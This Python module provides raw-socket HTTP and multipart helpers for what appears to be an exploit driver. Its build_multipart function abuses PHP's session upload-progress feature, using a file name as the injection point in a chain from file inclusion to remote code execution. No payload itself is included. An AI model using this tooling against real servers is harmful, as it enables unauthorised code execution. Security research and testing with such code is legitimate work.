"""Raw-socket HTTP + multipart helpers.

Same wire discipline as the repo's `poc/*` scripts (latin-1, manual
Connection: close reads, socket timeouts) so the driver behaves identically
to the already-verified POCs.
"""

import socket
from urllib.parse import urlsplit


def parse_target(target):
    """Accept a bare host, host:port, or a full http:// URL. Returns
    (scheme, host, port)."""
    u = urlsplit(target if "://" in target else f"//{target}")
    scheme = (u.scheme or "http").lower()
    host = u.hostname
    port = u.port or 80
    return scheme, host, port


def send_once(host, port, raw, timeout=15, recv_timeout=10):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(raw)
    s.settimeout(recv_timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
    s.close()
    return resp


def _headers(host, extra):
    h = {"Host": host, "Connection": "close"}
    h.update(extra or {})
    return "".join(f"{k}: {v}\r\n" for k, v in h.items()).encode("latin-1")


def http_get(host, port, path, headers=None, timeout=15, recv_timeout=10):
    raw = b"GET " + path.encode("latin-1") + b" HTTP/1.1\r\n" \
        + _headers(host, headers) + b"\r\n"
    return send_once(host, port, raw, timeout, recv_timeout)


def http_post(host, port, path, body, headers=None, timeout=30, recv_timeout=15):
    if headers is None:
        headers = {}
    headers = dict(headers)
    headers.setdefault("Content-Length", str(len(body)))
    raw = b"POST " + path.encode("latin-1") + b" HTTP/1.1\r\n" \
        + _headers(host, headers) + b"\r\n" + body
    return send_once(host, port, raw, timeout, recv_timeout)


def status(resp):
    return resp.split(b"\r\n", 1)[0].decode("latin-1", "replace") if resp else "<no response>"


def header_lines(resp):
    head = resp.split(b"\r\n\r\n", 1)[0]
    return [l.decode("latin-1", "replace") for l in head.split(b"\r\n")[1:]]


def body(resp):
    return resp.split(b"\r\n\r\n", 1)[1] if b"\r\n\r\n" in resp else b""


def header_value(resp, name):
    prefix = name.lower() + ":"
    for line in header_lines(resp):
        if line.lower().startswith(prefix):
            return line.split(":", 1)[1].strip()
    return None


def build_multipart(sid, progress, filename, file_data=b"Z", boundary="PH2S"):
    """lib payload -> multipart body carrying PHPSESSID,
    PHP_SESSION_UPLOAD_PROGRESS, and one file part (filename is the
    injection vector). Matches poc/verify_chain_a_lfi.py + verify_rce_gadget.py."""
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n{sid}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n{progress}\r\n'
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="f"; filename="{filename}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\n"
    ).encode("latin-1") + file_data + (
        f"\r\n--{boundary}--\r\n"
    ).encode("latin-1")
    return body, boundary